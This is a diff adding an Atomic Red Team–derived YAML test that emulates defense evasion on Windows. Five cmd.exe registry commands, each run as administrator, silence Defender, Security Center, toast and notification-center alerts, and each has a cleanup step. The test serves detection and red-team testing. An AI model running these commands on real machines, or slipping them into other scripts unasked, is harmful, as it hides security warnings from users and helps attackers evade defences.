@@ -1,0 +1,72 @@
+# Adapted from Atomic Red Team - Modify Registry
+# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1112
+# Original auto_generated_guids: 12e03af7-79f9-4f95-af48-d3f12f28a260, c30dada3-7777-4590-b970-dc890b8cf113, 45914594-8df6-4ea9-b3cc-7eb9321a807e, 003f466a-6010-4b15-803a-cbb478a314d7, c0d6d67f-1f63-42cc-95c0-5fd6b20082ad
+
+---
+api_version: 2.0
+uuid: 934ad994-c1c7-4bea-bb68-1fedf2c34639
+name: Disable Windows Notifications
+authors:
+  - isaac_fletcher
+  - Atomic Red Team
+description: |
+  Disable various Windows notification systems including Windows Defender notifications, Security Center notifications,
+  toast notifications, and notification center. Malware such as Redline, Azorult, and Remcos RAT use these techniques
+  to suppress alerts and warnings from security and system components.
+
+mitre:
+  tactics:
+    - "TA0005 Defense Evasion"
+  techniques:
+    - "T1112 Modify Registry"
+
+requirements:
+  platforms:
+    - os: windows
+  superuser: true
+
+steps:
+  - name: disable_defender_notification
+    executor: cmd.exe
+    inline: |
+      reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotifications" /t REG_DWORD /d 1 /f
+    cleanup:
+      executor: cmd.exe
+      inline: |
+        reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotifications" /f
+
+  - name: suppress_defender_notifications
+    executor: cmd.exe
+    inline: |
+      reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration" /v Notification_Suppress /t REG_DWORD /d 1 /f
+    cleanup:
+      executor: cmd.exe
+      inline: |
+        reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration" /v Notification_Suppress /f
+
+  - name: disable_security_center_notifications
+    executor: cmd.exe
+    inline: |
+      reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f
+    cleanup:
+      executor: cmd.exe
+      inline: |
+        reg delete HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\ImmersiveShell /v UseActionCenterExperience /f
+
+  - name: disable_toast_notifications
+    executor: cmd.exe
+    inline: |
+      reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f
+    cleanup:
+      executor: cmd.exe
+      inline: |
+        reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications /v ToastEnabled /t REG_DWORD /d 1 /f
+
+  - name: disable_notification_center
+    executor: cmd.exe
+    inline: |
+      reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f
+    cleanup:
+      executor: cmd.exe
+      inline: |
+        reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /t REG_DWORD /d 0 /f
